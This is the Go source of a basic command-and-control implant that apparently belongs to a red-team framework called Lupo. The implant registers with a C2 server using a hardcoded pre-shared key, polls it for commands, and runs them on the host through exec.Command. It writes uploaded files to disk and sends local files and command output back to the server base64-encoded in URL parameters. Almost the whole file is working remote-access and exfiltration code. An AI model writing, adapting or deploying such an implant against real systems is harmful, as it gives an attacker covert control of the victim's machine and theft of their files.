package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/mattn/go-shellwords"
)

// Configuration
type lupoImplant struct {
	updateInterval int
	protocol       string
	rhost          string
	rport          int
	id             int
	uuid           string
	psk            string
	data           string
}

var implant *lupoImplant

var rootCert string = `some cert here

`

func main() {

	// Construct implant

	implant = &lupoImplant{
		updateInterval: 1,
		protocol:       "https://",
		rhost:          "localhost",
		rport:          1337,
		id:             -1,
		uuid:           "",
		psk:            "wolfpack",
		data:           "",
	}

	// If a root certificate is specified, use it
	config := &tls.Config{}
	if rootCert != "" {
		// Create new cert pool
		rootCAs := x509.NewCertPool()

		// Add cert to certpool
		rootCAs.AppendCertsFromPEM([]byte(rootCert))

		// Trust the certpool
		config = &tls.Config{
			InsecureSkipVerify: false,
			RootCAs:            rootCAs,
		}

	} else {

		// Recurse and try again, failure is not an option
		main()

		/*
			// Otherwise accept any ssl cert
			config = &tls.Config{
				InsecureSkipVerify: true,
			}
		*/
	}

	// Create http client
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: config,
		},
	}

	for {
		ExecLoop(implant, client)
		time.Sleep(time.Duration(implant.updateInterval) * time.Second)
	}
}

func ExecLoop(implant *lupoImplant, client *http.Client) {

	var requestUrl string
	var requestParams string
	var serverResponse map[string]interface{}

	connectionString := implant.protocol + implant.rhost + ":" + strconv.Itoa(implant.rport)

	if implant.id == -1 {

		// Request registration passing a PSK and the register flag as true
		requestParams = "/?psk=" + implant.psk + "&register=true&update=" + strconv.Itoa(implant.updateInterval) + "&functions=" + url.QueryEscape("{\"rootme\":\"roots any system ever, no seriously\"}")
		requestUrl = connectionString + requestParams

		resp, err := client.Get(requestUrl)

		if err != nil {
			fmt.Println(err)
			return
		}

		jsonData, err := ioutil.ReadAll(resp.Body)

		if err != nil {
			return
		}

		// Parse the JSON response
		err = json.Unmarshal(jsonData, &serverResponse)

		if err != nil {
			return
		}

		// set the new session info for the implant structure
		implant.id = int(serverResponse["sessionID"].(float64))
		implant.uuid = serverResponse["UUID"].(string)

	} else {
		// Request new data from the C2 sending all auth in the form of PSK, sessionID, and UUID
		requestParams = "/?psk=" + implant.psk + "&sessionID=" + strconv.Itoa(implant.id) + "&UUID=" + implant.uuid
		requestUrl = connectionString + requestParams

		resp, err := client.Get(requestUrl)

		if err != nil {
			return
		}

		jsonData, err := ioutil.ReadAll(resp.Body)

		if err != nil {
			return
		}

		// We are only expecting raw cmd execution for this basic implant so the only use case is to parse cmd JSON response
		// Here we could also check the data for non-JSON/functional responses that the implant may have implemented
		err = json.Unmarshal(jsonData, &serverResponse)

		if err != nil {
			return
		}

		unparsedCmd := serverResponse["cmd"].(string)
		var operator string
		if serverResponse["user"].(string) != "" {
			operator = serverResponse["user"].(string)
		} else {
			operator = "server"
		}

		if unparsedCmd != "" {

			parsedCmd, err := shellwords.Parse(unparsedCmd)

			// Get the root command
			cmd := parsedCmd[0]

			// Cut off the root command and extract any args if they exist
			argS := parsedCmd[1:]

			var data []byte
			var dataString string
			var fileString string

			if err != nil {
				return
			}

			// Check if it is a command with our without args and execute appropriately
			if cmd != "" && len(argS) > 0 {
				// Maintain directory context if cd is issued
				if cmd == "cd" {
					os.Chdir(strings.Join(argS, " "))
				} else if cmd == "upload" {

					filename := argS[0]

					fileb64, err := base64.StdEncoding.DecodeString(strings.Join(argS[1:], " "))
					if err != nil {
						return
					}

					f, err := os.Create(filename)
					if err != nil {
						return
					}
					defer f.Close()

					if _, err := f.Write(fileb64); err != nil {
						return
					}
					if err := f.Sync(); err != nil {
						return
					}
				} else if cmd == "download" {
					filename := argS[0]

					// Open file on disk.
					f, err := os.Open(filename)

					if err != nil {
						return
					}

					reader := bufio.NewReader(f)
					content, _ := ioutil.ReadAll(reader)

					// Encode as base64.
					encoded := base64.StdEncoding.EncodeToString(content)

					fileString = "&filename=" + url.QueryEscape(filename) + "&file=" + url.QueryEscape(encoded)

				} else {
					data, err = exec.Command(cmd, argS...).Output()
				}
			} else if cmd != "" {
				if cmd == "rootme" {
					dataString = "you're not good enough to be root :("
				} else {
					data, err = exec.Command(cmd).Output()
				}
			}

			// URL encode data from exec output to account for weird characters like newlines in the URL string
			if dataString == "" {
				if data != nil {
					dataString = "&data=" + url.QueryEscape(string(data))
				}
			} else {
				dataString = "&data=" + url.QueryEscape(dataString)
			}

			// Return a response with our standard auth and include the data parameter with our command output to display in Lupo
			requestParams = "/?psk=" + implant.psk + "&sessionID=" + strconv.Itoa(implant.id) + "&UUID=" + implant.uuid + "&user=" + operator + dataString + fileString
			requestUrl = connectionString + requestParams

			resp, err = client.Get(requestUrl)

			if err != nil {
				return
			}

		}
	}
}
